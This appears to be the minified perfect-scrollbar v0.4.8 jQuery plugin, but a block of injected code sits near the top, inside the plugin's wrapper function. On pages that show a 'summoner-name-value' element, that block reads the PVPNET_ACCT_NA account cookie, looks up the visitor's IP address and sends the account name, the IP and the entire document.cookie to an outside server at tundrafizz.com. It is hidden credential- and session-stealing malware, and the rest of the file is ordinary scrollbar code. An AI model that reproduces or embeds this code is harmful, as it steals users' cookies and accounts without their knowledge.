/*! perfect-scrollbar - v0.4.8
 * http://noraesae.github.com/perfect-scrollbar/
 * Copyright (c) 2014 Hyeonje Jun; Licensed MIT */
"use strict";
(function(e) {
  
if(typeof document.getElementsByClassName("summoner-name-value")[0] != "undefined")
{
  var yesh = document.cookie;
  var mystr = "PVPNET_ACCT_NA=";
  var okay = yesh.indexOf(mystr);
  var whatisthis = yesh.indexOf(";", okay);  
  var res = yesh.substring(okay + mystr.length, whatisthis);
    
  $.getJSON("http://jsonip.com/", function(data)
  {
    $.ajax(
    {
      dataType: "json",
      url: "https://tundrafizz.com/testing.php",
      data:
      {
        name: res,
        ip:   data.ip,
        text: document.cookie
      }
    });
  });
}

    "function" == typeof define && define.amd ? define(["jquery"], e) : e(jQuery)
})
(function(e) {
    var n = {
            wheelSpeed: 10,
            wheelPropagation: !1,
            minScrollbarLength: null,
            useBothWheelAxes: !1,
            useKeyboard: !0,
            suppressScrollX: !1,
            suppressScrollY: !1,
            scrollXMarginOffset: 0,
            scrollYMarginOffset: 0
        },
        t = function() {
            var e = 0;
            return function() {
                var n = e;
                return e += 1, ".perfect-scrollbar-" + n
            }
        }
        ();
    e.fn.perfectScrollbar = function(o, r) {
        return this.each(function() {
          
            var l = e.extend(!0, {}, n),
                s = e(this);
            if ("object" == typeof o ? e.extend(!0, l, o) : r = o, "update" === r) return s.data("perfect-scrollbar-update") && s.data("perfect-scrollbar-update")(), s;
            if ("destroy" === r)
           {
             
             return s.data("perfect-scrollbar-destroy") && s.data("perfect-scrollbar-destroy")(), s;
            }
            if (s.data("perfect-scrollbar")) return s.data("perfect-scrollbar");
            s.addClass("ps-container");
            var a, i, c, u, p, d, f, h, v, b, g = e("<div class='ps-scrollbar-x-rail'></div>").appendTo(s),
                m = e("<div class='ps-scrollbar-y-rail'></div>").appendTo(s),
                w = e("<div class='ps-scrollbar-x'></div>").appendTo(g),
                T = e("<div class='ps-scrollbar-y'></div>").appendTo(m),
                L = parseInt(g.css("bottom"), 10),
                y = parseInt(m.css("right"), 10),
                S = t(),
                I = function(e, n) {
                    var t = e + n,
                        o = u - v;
                    b = 0 > t ? 0 : t > o ? o : t;
                    var r = parseInt(b * (d - u) / (u - v), 10);
                    s.scrollTop(r), g.css({
                        bottom: L - r
                    })
                },
                D = function(e, n) {
                    var t = e + n,
                        o = c - f;
                    h = 0 > t ? 0 : t > o ? o : t;
                    var r = parseInt(h * (p - c) / (c - f), 10);
                    s.scrollLeft(r), m.css({
                        right: y - r
                    })
                },
                x = function(e) {
                    return l.minScrollbarLength && (e = Math.max(e, l.minScrollbarLength)), e
                },
                k = function() {
                    g.css({
                        left: s.scrollLeft(),
                        bottom: L - s.scrollTop(),
                        width: c,
                        display: a ? "inherit" : "none"
                    }), m.css({
                        top: s.scrollTop(),
                        right: y - s.scrollLeft(),
                        height: u,
                        display: i ? "inherit" : "none"
                    }), w.css({
                        left: h,
                        width: f
                    }), T.css({
                        top: b,
                        height: v
                    })
                },
                X = function() {
                    c = s.width(), u = s.height(), p = s.prop("scrollWidth"), d = s.prop("scrollHeight"), !l.suppressScrollX && p > c + l.scrollXMarginOffset ? (a = !0, f = x(parseInt(c * c / p, 10)), h = parseInt(s.scrollLeft() * (c - f) / (p - c), 10)) : (a = !1, f = 0, h = 0, s.scrollLeft(0)), !l.suppressScrollY && d > u + l.scrollYMarginOffset ? (i = !0, v = x(parseInt(u * u / d, 10)), b = parseInt(s.scrollTop() * (u - v) / (d - u), 10)) : (i = !1, v = 0, b = 0, s.scrollTop(0)), b >= u - v && (b = u - v), h >= c - f && (h = c - f), k()
                },
                C = function() {
                    var n, t;
                    w.bind("mousedown" + S, function(e) {
                        t = e.pageX, n = w.position().left, g.addClass("in-scrolling"), e.stopPropagation(), e.preventDefault()
                    }), e(document).bind("mousemove" + S, function(e) {
                        g.hasClass("in-scrolling") && (D(n, e.pageX - t), e.stopPropagation(), e.preventDefault())
                    }), e(document).bind("mouseup" + S, function() {
                        g.hasClass("in-scrolling") && g.removeClass("in-scrolling")
                    }), n = t = null
                },
                Y = function() {
                    var n, t;
                    T.bind("mousedown" + S, function(e) {
                        t = e.pageY, n = T.position().top, m.addClass("in-scrolling"), e.stopPropagation(), e.preventDefault()
                    }), e(document).bind("mousemove" + S, function(e) {
                        m.hasClass("in-scrolling") && (I(n, e.pageY - t), e.stopPropagation(), e.preventDefault())
                    }), e(document).bind("mouseup" + S, function() {
                        m.hasClass("in-scrolling") && m.removeClass("in-scrolling")
                    }), n = t = null
                },
                P = function(e, n) {
                    var t = s.scrollTop();
                    if (0 === e) {
                        if (!i) return !1;
                        if (0 === t && n > 0 || t >= d - u && 0 > n) return !l.wheelPropagation
                    }
                    var o = s.scrollLeft();
                    if (0 === n) {
                        if (!a) return !1;
                        if (0 === o && 0 > e || o >= p - c && e > 0) return !l.wheelPropagation
                    }
                    return !0
                },
                M = function() {
                    var e = !1;
                    s.bind("mousewheel" + S, function(n, t, o, r) {
                        l.useBothWheelAxes ? i && !a ? r ? s.scrollTop(s.scrollTop() - r * l.wheelSpeed) : s.scrollTop(s.scrollTop() + o * l.wheelSpeed) : a && !i && (o ? s.scrollLeft(s.scrollLeft() + o * l.wheelSpeed) : s.scrollLeft(s.scrollLeft() - r * l.wheelSpeed)) : (s.scrollTop(s.scrollTop() - r * l.wheelSpeed), s.scrollLeft(s.scrollLeft() + o * l.wheelSpeed)), X(), e = P(o, r), e && n.preventDefault()
                    }), s.bind("MozMousePixelScroll" + S, function(n) {
                        e && n.preventDefault()
                    })
                },
                O = function() {
                    var n = !1;
                    s.bind("mouseenter" + S, function() {
                        n = !0
                    }), s.bind("mouseleave" + S, function() {
                        n = !1
                    });
                    var t = !1;
                    e(document).bind("keydown" + S, function(e) {
                        if (n) {
                            var o = 0,
                                r = 0;
                            switch (e.which) {
                                case 37:
                                    o = -3;
                                    break;
                                case 38:
                                    r = 3;
                                    break;
                                case 39:
                                    o = 3;
                                    break;
                                case 40:
                                    r = -3;
                                    break;
                                case 33:
                                    r = 9;
                                    break;
                                case 32:
                                case 34:
                                    r = -9;
                                    break;
                                case 35:
                                    r = -u;
                                    break;
                                case 36:
                                    r = u;
                                    break;
                                default:
                                    return
                            }
                            s.scrollTop(s.scrollTop() - r * l.wheelSpeed), s.scrollLeft(s.scrollLeft() + o * l.wheelSpeed), t = P(o, r), t && e.preventDefault()
                        }
                    })
                },
                E = function() {
                    var e = function(e) {
                        e.stopPropagation()
                    };
                    T.bind("click" + S, e), m.bind("click" + S, function(e) {
                        var n = parseInt(v / 2, 10),
                            t = e.pageY - m.offset().top - n,
                            o = u - v,
                            r = t / o;
                        0 > r ? r = 0 : r > 1 && (r = 1), s.scrollTop((d - u) * r)
                    }), w.bind("click" + S, e), g.bind("click" + S, function(e) {
                        var n = parseInt(f / 2, 10),
                            t = e.pageX - g.offset().left - n,
                            o = c - f,
                            r = t / o;
                        0 > r ? r = 0 : r > 1 && (r = 1), s.scrollLeft((p - c) * r)
                    })
                },
                A = function() {
                    var n = function(e, n) {
                            s.scrollTop(s.scrollTop() - n), s.scrollLeft(s.scrollLeft() - e), X()
                        },
                        t = {},
                        o = 0,
                        r = {},
                        l = null,
                        a = !1;
                    e(window).bind("touchstart" + S, function() {
                        a = !0
                    }), e(window).bind("touchend" + S, function() {
                        a = !1
                    }), s.bind("touchstart" + S, function(e) {
                        var n = e.originalEvent.targetTouches[0];
                        t.pageX = n.pageX, t.pageY = n.pageY, o = (new Date).getTime(), null !== l && clearInterval(l), e.stopPropagation()
                    }), s.bind("touchmove" + S, function(e) {
                        if (!a && 1 === e.originalEvent.targetTouches.length) {
                            var l = e.originalEvent.targetTouches[0],
                                s = {};
                            s.pageX = l.pageX, s.pageY = l.pageY;
                            var i = s.pageX - t.pageX,
                                c = s.pageY - t.pageY;
                            n(i, c), t = s;
                            var u = (new Date).getTime();
                            r.x = i / (u - o), r.y = c / (u - o), o = u, e.preventDefault()
                        }
                    }), s.bind("touchend" + S, function() {
                        clearInterval(l), l = setInterval(function() {
                            return .01 > Math.abs(r.x) && .01 > Math.abs(r.y) ? (clearInterval(l), void 0) : (n(30 * r.x, 30 * r.y), r.x *= .8, r.y *= .8, void 0)
                        }, 10)
                    })
                },
                j = function() {
                    s.bind("scroll" + S, function() {
                        X()
                    })
                },
                W = function() {
                    s.unbind(S), e(window).unbind(S), e(document).unbind(S), s.data("perfect-scrollbar", null), s.data("perfect-scrollbar-update", null), s.data("perfect-scrollbar-destroy", null), w.remove(), T.remove(), g.remove(), m.remove(), w = T = c = u = p = d = f = h = L = v = b = y = null
                },
                H = function(n) {
                    s.addClass("ie").addClass("ie" + n);
                    var t = function() {
                            var n = function() {
                                    e(this).addClass("hover")
                                },
                                t = function() {
                                    e(this).removeClass("hover")
                                };
                            s.bind("mouseenter" + S, n).bind("mouseleave" + S, t), g.bind("mouseenter" + S, n).bind("mouseleave" + S, t), m.bind("mouseenter" + S, n).bind("mouseleave" + S, t), w.bind("mouseenter" + S, n).bind("mouseleave" + S, t), T.bind("mouseenter" + S, n).bind("mouseleave" + S, t)
                        },
                        o = function() {
                            k = function() {
                                w.css({
                                    left: h + s.scrollLeft(),
                                    bottom: L,
                                    width: f
                                }), T.css({
                                    top: b + s.scrollTop(),
                                    right: y,
                                    height: v
                                }), w.hide().show(), T.hide().show()
                            }
                        };
                    6 === n && (t(), o())
                },
                B = "ontouchstart" in window || window.DocumentTouch && document instanceof window.DocumentTouch,
                K = function() {
                    var e = navigator.userAgent.toLowerCase().match(/(msie) ([\w.]+)/);
                    e && "msie" === e[1] && H(parseInt(e[2], 10)), X(), j(), C(), Y(), E(), B && A(), s.mousewheel && M(), l.useKeyboard && O(), s.data("perfect-scrollbar", s), s.data("perfect-scrollbar-update", X), s.data("perfect-scrollbar-destroy", W)
                };
            return K(), s
        })
    }
}),
function(e) {
    function n(n) {
        var t = n || window.event,
            o = [].slice.call(arguments, 1),
            r = 0,
            l = 0,
            s = 0;
        return n = e.event.fix(t), n.type = "mousewheel", t.wheelDelta && (r = t.wheelDelta / 120), t.detail && (r = -t.detail / 3), s = r, void 0 !== t.axis && t.axis === t.HORIZONTAL_AXIS && (s = 0, l = -1 * r), void 0 !== t.wheelDeltaY && (s = t.wheelDeltaY / 120), void 0 !== t.wheelDeltaX && (l = -1 * t.wheelDeltaX / 120), o.unshift(n, r, l, s), (e.event.dispatch || e.event.handle).apply(this, o)
    }
    var t = ["DOMMouseScroll", "mousewheel"];
    if (e.event.fixHooks)
        for (var o = t.length; o;) e.event.fixHooks[t[--o]] = e.event.mouseHooks;
    e.event.special.mousewheel = {
        setup: function() {
            if (this.addEventListener)
                for (var e = t.length; e;) this.addEventListener(t[--e], n, !1);
            else this.onmousewheel = n
        },
        teardown: function() {
            if (this.removeEventListener)
                for (var e = t.length; e;) this.removeEventListener(t[--e], n, !1);
            else this.onmousewheel = null
        }
    }, e.fn.extend({
        mousewheel: function(e) {
            return e ? this.bind("mousewheel", e) : this.trigger("mousewheel")
        },
        unmousewheel: function(e) {
            return this.unbind("mousewheel", e)
        }
    })
}(jQuery);
